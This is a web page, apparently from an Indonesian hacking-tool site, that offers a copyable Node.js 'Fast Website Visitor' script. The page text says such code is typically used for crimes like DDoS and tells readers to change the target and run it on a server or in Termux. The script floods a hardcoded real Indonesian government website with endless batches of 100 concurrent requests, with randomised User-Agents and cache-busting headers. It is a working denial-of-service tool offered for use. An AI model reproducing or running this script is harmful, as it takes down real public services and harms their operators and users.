<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fast Website Visitor</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        function copyToClipboard() {
            const codeElement = document.getElementById("code");
            const textArea = document.createElement("textarea");
            textArea.value = codeElement.innerText;
            document.body.appendChild(textArea);
            textArea.select();
            document.execCommand("copy");
            document.body.removeChild(textArea);
            
            const copyButton = document.getElementById("copy-btn");
            copyButton.innerText = "Copied!";
            setTimeout(() => copyButton.innerText = "Copy Code", 2000);
        }
    </script>
</head>
<body class="bg-gray-900 text-white font-sans">
    <div class="container mx-auto p-6">
        <div class="bg-gray-800 p-6 rounded-lg shadow-xl">
            <h1 class="text-3xl font-bold text-cyan-400">🚀 Fast Website Visitor</h1>
            <p class="mt-2 text-gray-300">Script ini digunakan untuk mengunjungi website dengan berbagai User-Agent secara acak dan paralel. Biasanya code ini digunakan untuk kejahatan contohnya ddos kamu bisa mengganti target link di dalam code nya ya bisa di baca copy dibawah ini dan pastekan di server kamu bisa juga menggunakan termux ya !!</p>
            <button id="copy-btn" onclick="copyToClipboard()" class="mt-4 bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-2 px-4 rounded-lg shadow-md">
                Copy Code
            </button>
            <a href="termux.html" class="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg shadow-md">
                Termux
            </a>
            <pre class="mt-4 bg-gray-700 p-4 rounded-lg overflow-auto text-sm" id="code">
const fs = require('fs');
const axios = require('axios');
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(ua => ua.trim());
const config = {
    targetUrl: 'https://pekalongankota.go.id/',
    maxConcurrent: 100
};
const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
async function makeVisit(userAgent) {
    try {
        const response = await axios({
            url: config.targetUrl,
            method: 'GET',
            headers: {
                'User-Agent': userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache',
                'Connection': 'keep-alive'
            },
            timeout: 5000
        });
        console.log(`[SUCCESS] Visit berhasil dengan UA: ${userAgent.substring(0, 50)}...`);
        return true;
    } catch (error) {
        console.error(`[ERROR] Gagal visit:`, error.message);
        return false;
    }
}
async function runVisitor() {
    console.log('Starting fast website visitor...');
    console.log(`Loaded ${userAgents.length} user agents`);
    let successCount = 0;
    let failCount = 0;
    while (true) {
        const visitPromises = [];
        for (let i = 0; i < config.maxConcurrent; i++) {
            const userAgent = getRandomUserAgent();
            visitPromises.push(makeVisit(userAgent));
        }
        const results = await Promise.all(visitPromises);
        results.forEach(result => {
            if (result) successCount++;
            else failCount++;
        });
        console.log(`Stats - Success: ${successCount}, Failed: ${failCount}, Total: ${successCount + failCount}`);
    }
}
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});
process.on('unhandledRejection', (error) => {
    console.error('Unhandled Rejection:', error);
});
runVisitor().catch(console.error);
            </pre>
        </div>
    </div>
</body>
</html>
